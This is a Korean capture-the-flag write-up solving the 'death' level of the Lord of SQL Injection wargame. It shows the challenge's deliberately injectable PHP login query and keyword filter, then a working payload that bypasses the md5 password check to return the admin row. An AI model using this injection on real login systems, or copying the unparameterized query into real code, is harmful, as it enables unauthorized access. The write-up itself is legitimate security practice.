---
title: "[Lord of SQL Injection] LoS - death 문제풀이"
date: 2019-06-13
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

두 번째 문제는 `death`이다.
이 전 문제와 비슷해서 쉽게 풀 수 있었다.  

<!--more-->

코드는 다음과 같다.  

```php
-----------------------------------------------------------------
query : select id from prob_death where id='' and pw=md5('')
-----------------------------------------------------------------

<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)|admin/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)|admin/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_death where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("death");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

이 전 문제와 동일하게 방화벽이 걸려 있으며, 다른점은 `pw`가 `md5`로 해싱된다는 것과 추출한 결과의 `id` 값이 `admin`이어야 한다는 것이다.
언뜻 보기에는 `admin`의 정확한 `pw` 값을 알아야 할 것 같다.
하지만 어찌어찌 방화벽을 우회해서 DB에 저장된 pw 값을 뽑아낸다 하더라도 그 값은 `md5`로 해싱 된 값이기 때문에 `pw`를 복구하기가 어렵다.
때문에 뒤의 `pw`를 검사하는 부분을 무시하도록 혹은 검증하지 않도록 공격을 수행해야 한다.
이를 위해 내가 생각한 쿼리는 다음과 같다.  

```plain
id=-1'<@=1 OR id<'guest' OR '&pw=a
```

이를 입력하면 완성되는 쿼리는 다음과 같다.  

```mysql
select id from prob_death where id='-1'<@=1 OR id<'guest' OR '' and pw=md5('a')
```

`where 절`을 살펴보면 조건은 크게 3개이다.
첫 번째로 `id='-1'<@1`은 이 전 문제에서 설명했다시피 `'-1'<@1`이 `NULL`이 되며 `id=NULL`이 되기 때문에 `거짓`이 된다.
이 때, 두 번째 조건은 `id<'guest'`이다.  `id`의 값이 `guest` 보다 작은 값을 찾게 되는데, 이는 테이블에 값이 `admin`과 `guest`만 있다고 가정하고 사용 한 조건이다.
알파벳 `a`는 `g`보다 값이 작기 때문에 `admin`의 값은 `guest`보다 작다.
만약 테이블에 `admin`과 `guest`의 두 값만 있다면, `id<'guest'`의 결과는 당연히 `admin`이 될 것이다.
여기서 두 번째 조건이 참이 되었기 때문에 뒤의 `'' and pw=md5('a')`는 무시하게 된다.
해당 쿼리를 문제에 전달하면 아래와 같이 `admin` 값을 추출하며 문제를 풀 수 있다.  

```php
-------------------------------------------------------------------------------------------
query : select id from prob_death where id='-1'<@=1 OR id<'guest' OR '' and pw=md5('a')
-------------------------------------------------------------------------------------------

DEATH Clear!
<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)|admin/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)|admin/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_death where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("death");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

---

```plain
DEATH Clear!!
```